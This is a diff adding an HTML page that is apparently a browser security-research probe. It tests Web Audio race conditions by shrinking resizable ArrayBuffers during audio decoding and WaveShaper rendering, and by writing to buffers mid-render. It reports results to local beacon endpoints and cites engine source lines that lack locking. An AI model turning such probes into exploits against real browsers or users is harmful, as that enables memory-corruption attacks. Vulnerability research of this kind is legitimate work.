@@ -1,0 +1,106 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<script src="runtime-derive/derive-runtime.js"></script>
+<script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script>
+<title>FA-v36-wa — press-26: WebAudio races (decode sin copia ni lock + curve shrink + write-during-render)</title></head>
+<body><pre id="out">FA-v36-wa…</pre>
+<script>
+(function(){
+"use strict";
+/* FA-v36-wa — press-26 (probes WA-1/2/3 de K3A-WA; todos 0-crash sub-página).
+ * WA-1: decodeAudioData NO copia NI detacha (BaseAudioContext.idl:54) y el
+ *   hilo decoder lee data()/byteLength() sin lock (AsyncAudioDecoder.cpp:92)
+ *   → shrink RAB a 0/5/20ms: ¿decode truncado/error/distribución mixta?
+ * WA-2B: escribir getChannelData DURANTE render offline → output torn.
+ * WA-3: WaveShaper con curve sobre NUESTRO RAB → shrink sub-página mid-render
+ *   → per-quantum re-read visible en el output.
+ * Reglas: umbrales por ruido ±0.001; hex de samples en beacons; ENV completo. */
+var RID="v36w"+Date.now().toString(36).slice(-13);
+var out=document.getElementById("out");
+function say(s){try{out.appendChild(document.createTextNode("\n"+s));}catch(e){}}
+function bk(s,b){try{fetch("/beacon/V36-"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
+var HB=setInterval(function(){bk("HB","main-hb");},2000);
+
+var dr="-",rt="-";
+try{ dr=typeof window.deriveRuntime; rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-"; }catch(e){}
+bk("L","v36-wa; dr="+dr+"; rt="+rt);
+var aw=(typeof AudioWorkletNode), isc=(typeof isSecureContext!=="undefined"?String(isSecureContext):"-"), oac=(typeof OfflineAudioContext), dac="-";
+bk("ENV","AWN="+aw+";secure="+isc+";OAC="+oac+";AB64="+(typeof Float32Array));
+
+/* WAV PCM16 mono 44100 válido en RAB */
+function mkWavRAB(samples, maxLen){
+  var dataLen=samples*2, total=44+dataLen;
+  var rab=new ArrayBuffer(total,{maxByteLength:maxLen||total});
+  var dv=new DataView(rab), u8=new Uint8Array(rab);
+  function ws(o,s){ for(var i=0;i<s.length;i++) u8[o+i]=s.charCodeAt(i); }
+  ws(0,"RIFF"); dv.setUint32(4,total-8,true); ws(8,"WAVE"); ws(12,"fmt ");
+  dv.setUint32(16,16,true); dv.setUint16(20,1,true); dv.setUint16(22,1,true);
+  dv.setUint32(24,44100,true); dv.setUint32(28,88200,true); dv.setUint16(32,2,true);
+  dv.setUint16(34,16,true); ws(36,"data"); dv.setUint32(40,dataLen,true);
+  for(var i=0;i<samples;i++){ dv.setInt16(44+i*2, (i%100<50?12000:-12000), true); } /* cuadrada audible */
+  return rab;
+}
+
+/* WA-1 ×3 delays (0/5/20ms) — cada uno con su propio ctx+RAB fresco */
+function wa1(delayMs, tag){
+  try{
+    var ctx=new OfflineAudioContext(1,44100,44100);
+    var rab=mkWavRAB(2000, 4096); /* sub-página: 2044B datos, maxByteLength 4096 */
+    var p=ctx.decodeAudioData(rab);
+    function shrink(){ try{ rab.resize(64); }catch(e){} }
+    if(delayMs===0){ shrink(); } else { setTimeout(shrink, delayMs); }
+    var t0=Date.now();
+    p.then(function(b){
+      var ch=b.getChannelData(0), hex="";
+      for(var i=0;i<8&&i<ch.length;i++){ var v=Math.round(ch[i]*10000); hex+=(v<0?"-":"+")+Math.abs(v)+","; }
+      bk(tag,"ok;len="+b.length+";dur="+b.duration.toFixed(4)+";ms="+(Date.now()-t0)+";head="+hex);
+    },function(e){
+      bk(tag,"err:"+(e&&e.name)+";ms="+(Date.now()-t0));
+    });
+  }catch(e){ bk(tag,"E:"+String((e&&e.message)||e).slice(0,50)); }
+}
+wa1(0,"WA1a");   /* shrink inmediato (misma tarea) */
+setTimeout(function(){ wa1(5,"WA1b"); },300);   /* shrink a 5ms */
+setTimeout(function(){ wa1(20,"WA1c"); },700);  /* shrink a 20ms */
+
+/* WA-2B — write-during-render: marcar 0.7, renderizar, escribir 0.0 a mitad */
+setTimeout(function(){
+  try{
+    var ctx=new OfflineAudioContext(1,22050,44100); /* 0.5s */
+    var buf=ctx.createBuffer(1,22050,44100);
+    var ch=buf.getChannelData(0);
+    for(var i=0;i<ch.length;i++) ch[i]=0.7;
+    var src=ctx.createBufferSource(); src.buffer=buf; src.connect(ctx.destination); src.start();
+    var pr=ctx.startRendering();
+    /* escribir ceros a mitad del render (aprox por tiempo) */
+    setTimeout(function(){ try{ for(var i=0;i<ch.length;i++) ch[i]=0.0; }catch(e){} },3);
+    pr.then(function(out){
+      var o=out.getChannelData(0), nz=0, z=0;
+      for(var i=0;i<o.length;i++){ if(Math.abs(o[i])>0.35) nz++; else z++; }
+      bk("WA2","ok;nonZero="+nz+";zero="+z+" (mezcla nz+z = torn confirmado; todo-nz = render antes del write; todo-z = write ganó)");
+    },function(e){ bk("WA2","err:"+(e&&e.name)); });
+  }catch(e){ bk("WA2","E:"+String((e&&e.message)||e).slice(0,50)); }
+},1100);
+
+/* WA-3 — WaveShaper con curve sobre NUESTRO RAB + shrink sub-página */
+setTimeout(function(){
+  try{
+    var ctx=new OfflineAudioContext(1,22050,44100);
+    var rab=new ArrayBuffer(4096*4,{maxByteLength:4096*4});
+    var curve=new Float32Array(rab); curve.fill(0.5);
+    var ws2=ctx.createWaveShaper(); ws2.curve=curve;
+    var cs=ctx.createConstantSource(); cs.offset.value=-1.0; /* mapea al inicio de la curve */
+    cs.connect(ws2); ws2.connect(ctx.destination); cs.start();
+    var pr=ctx.startRendering();
+    setTimeout(function(){ try{ rab.resize(4); }catch(e){} },3); /* curve->length 4096→1 mid-render */
+    pr.then(function(out){
+      var o=out.getChannelData(0), head=[], tail=[];
+      for(var i=0;i<4;i++) head.push(o[i].toFixed(3));
+      for(var j=o.length-4;j<o.length;j++) tail.push(o[j].toFixed(3));
+      bk("WA3","ok;head=["+head.join(",")+"];tail=["+tail.join(",")+"] (head≈0.5 y tail≠0.5 = re-read por quantum; todo igual = cacheó)");
+    },function(e){ bk("WA3","err:"+(e&&e.name)); });
+  }catch(e){ bk("WA3","E:"+String((e&&e.message)||e).slice(0,50)); }
+},1600);
+
+setTimeout(function(){ clearInterval(HB); bk("Z","FA-v36-wa complete"); },4000);
+})();
+</script></body></html>
